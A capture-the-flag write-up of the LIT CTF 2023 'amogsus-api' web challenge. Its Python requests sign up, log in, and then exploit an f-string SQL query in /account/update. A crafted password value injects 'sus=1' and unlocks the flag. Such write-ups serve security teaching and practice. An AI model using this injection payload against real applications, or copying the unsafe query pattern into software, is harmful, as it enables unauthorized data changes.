# LIT CTF 2023 - amogsus-api

| Category |
|----------|
| `web`    | 

## Challenge:

I'm working on this new api for the awesome game amogsus
There seems to be a vulnerability I missed though...

## Solution:

If we open the page, we get the following JSON response:

```json
{
    "message": "Welcome to the amogsus API! I've been working super hard on it in the past few weeks. You can use a tool like postman to test it out. Start by signing up at /signup. Also, I think I might have forgotten to sanatize an input somewhere... Good luck!"
}
```

Sending another GET to `/signup` does not work, the service replies with a 405 "Method Not Allowed". It's clear, even from the name of this challenge, that this is an API that we need to check out with something else than a browser. I like to use Python for challenges like this. But instead of sending POST request blindly to the route, let's take a look at the challenge's code. (You can find the full code here: [main.py](./assets/files/main.py))

`/signup` seems to expect an `username` and a `password`. That data, as well as `sus = False` is inserted into the database. Fair enough, let's do this:

```python
url = "http://litctf.org:31783"
username = f"pkemkes{random.randint(0, 10**10)}"
password = f"pkemkes{random.randint(0, 10**10)}"

r = requests.post(url + "/signup", data={
    "username": username,
    "password": password
})
print(r.text)
```

This prints the following:

```json
{
    "message": "User created! You can now login at /login"
}
```

Okay. According to the code, `/login` also expects the `username` and the `password`. It creates a session with a unique session token. Let's do that:

```python
r = requests.post(url + "/login", data={
    "username": username,
    "password": password
})
print(r.text)
```

This is the server's response:

```json
{
    "message": "Login successful! You can find your account information at /account. Make sure to provide your token! You should know how to bear your Authorization...",
    "token": "O3Q8UEE9U56AVR93HGDWSS9JWXX71XR0CS69UOSE"
}
```

If we now send a GET request to `/account`, we can get some info about our account. We just need to provide the `token` in a header called `Authorization`. Okay then:

```python
headers = {"Authorization": r.json()["token"]}
r = requests.get(url + "/account", headers=headers)
print(r.text)
```

And here the response:

```json
{
    "message": "Here is your account information! You can update your account at /account/update. The flag can also be found at /flag. You need to be sus to get access tho...",
    "password": "pkemkes710944983",
    "sus": 0,
    "username": "pkemkes6405266515"
}
```

So far so good. There is a `/flag` route. Let's be naive an send a GET:

```python
r = requests.get(url + "/flag", headers=headers)
print(r.text)
```

But that's what the server says about that:

```json
{
    "message": "You need to be an sus to view the flag!"
}
```

Too bad. Okay, let's take a closer look at the server's code. Could there be a potential SQL injection here somewhere?

Yes! In the route that we haven't tested yet: `/account/update`. In contrast to all other SQL queries, it uses an unsafe format string for adding user input into the query:

```python
cursor.execute(f'UPDATE users SET username="{username}", password="{password}" WHERE username="{session["username"]}"')
```

So, we could inject there anywhere. Good thing is, the password can be anything, it does not need to be our current one. So, we can try to send the following request:

```python
r = requests.post(url + "/account/update", headers=headers, data={
    "username": username,
    "password": password + f"\", sus=1 WHERE username = \"{username}\"; -- "
})
print(r.text)
```

If the server behaves as we expect, this should result in the following query:

```sql
UPDATE users SET username="pkemkes6405266515", password="pkemkes710944983", sus=1 WHERE username = "pkemkes6405266515"; -- " WHERE username="{session["username"]}"
```

That should keep username and password the same and simply set our `sus` value to `1`. Let's make sure and ask `/account` again:

```json
{
    "message": "Here is your account information! You can update your account at /account/update. The flag can also be found at /flag. You need to be sus to get access tho...",
    "password": "pkemkes710944983",
    "sus": 1,
    "username": "pkemkes6405266515"
}
```

Awesome! So... Whats the response of `/flag` now?

```json
{
    "message": "Congrats! The flag is: flagLITCTF{redacted}"
}
```

Here is the full solution: [solve.py](./assets/solve.py)
